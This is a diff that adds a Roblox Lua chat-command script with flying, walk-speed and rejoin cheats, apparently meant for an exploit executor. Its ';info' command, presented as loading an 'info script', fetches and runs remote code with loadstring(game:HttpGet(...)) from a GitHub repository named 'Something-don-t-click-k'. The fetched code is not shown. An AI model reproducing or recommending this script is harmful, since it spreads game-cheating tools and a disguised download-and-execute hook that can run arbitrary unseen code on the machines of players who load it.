@@ -1,0 +1,222 @@
+-- Services
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local userInput = game:GetService("UserInputService")
+local runService = game:GetService("RunService")
+local teleportService = game:GetService("TeleportService")
+local starterGui = game:GetService("StarterGui")
+
+-- Variables
+local flyEnabled = false
+local flySpeed = 50
+local bodyVelocity, bodyGyro
+local flyConnection
+
+-- Display Notification on Script Load
+starterGui:SetCore("SendNotification", {
+    Title = "Script Loaded";
+    Text = "The fly script has been loaded successfully!";
+    Duration = 5;
+})
+
+-- Function to enable flying
+local function enableFly(speed)
+    if flyEnabled then return end
+    flyEnabled = true
+
+    -- Create BodyVelocity and BodyGyro for flying
+    bodyVelocity = Instance.new("BodyVelocity", rootPart)
+    bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bodyVelocity.Velocity = Vector3.zero
+
+    bodyGyro = Instance.new("BodyGyro", rootPart)
+    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
+    bodyGyro.CFrame = rootPart.CFrame
+
+    -- Input Direction Handling
+    local direction = Vector3.zero
+    local function updateDirection()
+        direction = Vector3.zero
+        if userInput:IsKeyDown(Enum.KeyCode.W) then
+            direction = direction + Vector3.new(0, 0, -1)
+        end
+        if userInput:IsKeyDown(Enum.KeyCode.S) then
+            direction = direction + Vector3.new(0, 0, 1)
+        end
+        if userInput:IsKeyDown(Enum.KeyCode.A) then
+            direction = direction + Vector3.new(-1, 0, 0)
+        end
+        if userInput:IsKeyDown(Enum.KeyCode.D) then
+            direction = direction + Vector3.new(1, 0, 0)
+        end
+        if userInput:IsKeyDown(Enum.KeyCode.Space) then
+            direction = direction + Vector3.new(0, 1, 0)
+        end
+        if userInput:IsKeyDown(Enum.KeyCode.LeftControl) or userInput:IsKeyDown(Enum.KeyCode.LeftShift) then
+            direction = direction + Vector3.new(0, -1, 0)
+        end
+    end
+
+    -- Apply Velocity and Rotation
+    flyConnection = runService.RenderStepped:Connect(function()
+        updateDirection()
+        if flyEnabled then
+            bodyVelocity.Velocity = (workspace.CurrentCamera.CFrame.LookVector * direction.Magnitude * speed)
+            bodyGyro.CFrame = workspace.CurrentCamera.CFrame
+        end
+    end)
+end
+
+-- Function to disable flying
+local function disableFly()
+    if not flyEnabled then return end
+    flyEnabled = false
+
+    -- Cleanup body movers
+    if bodyVelocity then bodyVelocity:Destroy() end
+    if bodyGyro then bodyGyro:Destroy() end
+
+    -- Disconnect RenderStepped
+    if flyConnection then
+        flyConnection:Disconnect()
+        flyConnection = nil
+    end
+end
+
+-- Function to set walk speed
+local function setWalkSpeed(speed)
+    local newSpeed = tonumber(speed)
+    if newSpeed and newSpeed > 0 then
+        humanoid.WalkSpeed = newSpeed
+        starterGui:SetCore("SendNotification", {
+            Title = "Speed Changed";
+            Text = "Walk speed set to " .. newSpeed;
+            Duration = 3;
+        })
+    else
+        starterGui:SetCore("SendNotification", {
+            Title = "Error";
+            Text = "Invalid speed. Example usage: ;ws 30";
+            Duration = 3;
+        })
+    end
+end
+
+-- Function to rejoin the game
+local function rejoinGame()
+    starterGui:SetCore("SendNotification", {
+        Title = "Rejoining";
+        Text = "Teleporting to the current game...";
+        Duration = 3;
+    })
+    teleportService:Teleport(game.PlaceId)
+end
+
+-- Function to list available commands
+local function listCommands()
+    local commands = [[
+Available Commands:
+;fly [speed] - Enable flying with optional speed (default 50)
+;unfly - Disable flying
+;ws, ;speed, ;walkspeed [speed] - Set walk speed
+;rejoin, ;rj - Rejoin the game
+;cmds - List all available commands
+;info - Load and execute external info script
+    ]]
+    starterGui:SetCore("SendNotification", {
+        Title = "Commands List";
+        Text = "Check the output for full command details.";
+        Duration = 5;
+    })
+    print(commands)
+end
+
+-- Function to execute the ;info command
+local function executeInfo()
+    starterGui:SetCore("SendNotification", {
+        Title = "Executing Info";
+        Text = "Loading external script...";
+        Duration = 3;
+    })
+
+    -- Load and execute the external script
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/guest433/Something-don-t-click-k/refs/heads/main/starting%20"))()
+    end)
+
+    -- Notify the player about the success or failure of the operation
+    if success then
+        starterGui:SetCore("SendNotification", {
+            Title = "Info Loaded";
+            Text = "The external script has been executed.";
+            Duration = 3;
+        })
+    else
+        starterGui:SetCore("SendNotification", {
+            Title = "Error";
+            Text = "Failed to load external script: " .. tostring(result);
+            Duration = 5;
+        })
+    end
+end
+
+-- Chat Command Handler
+player.Chatted:Connect(function(message)
+    local args = string.split(message, " ")
+    local command = args[1]:lower()
+
+    if command == ";fly" then
+        local speed = tonumber(args[2]) or flySpeed
+        starterGui:SetCore("SendNotification", {
+            Title = "Flying Enabled";
+            Text = "Flying at speed " .. speed;
+            Duration = 3;
+        })
+        enableFly(speed)
+
+    elseif command == ";unfly" then
+        starterGui:SetCore("SendNotification", {
+            Title = "Flying Disabled";
+            Text = "You are no longer flying.";
+            Duration = 3;
+        })
+        disableFly()
+
+    elseif command == ";ws" or command == ";speed" or command == ";walkspeed" then
+        if args[2] then
+            setWalkSpeed(args[2])
+        else
+            starterGui:SetCore("SendNotification", {
+                Title = "Error";
+                Text = "Specify a speed. Example: ;ws 30";
+                Duration = 3;
+            })
+        end
+
+    elseif command == ";rejoin" or command == ";rj" then
+        rejoinGame()
+
+    elseif command == ";cmds" then
+        listCommands()
+
+    elseif command == ";info" then
+        executeInfo()
+
+    else
+        starterGui:SetCore("SendNotification", {
+            Title = "Unknown Command";
+            Text = "Use ;cmds to see all commands.";
+            Duration = 3;
+        })
+    end
+end)
+
+-- Handle Respawning
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    humanoid = newCharacter:WaitForChild("Humanoid")
+    rootPart = newCharacter:WaitForChild("HumanoidRootPart")
+    disableFly() -- Ensure flying is disabled upon respawn
+end)
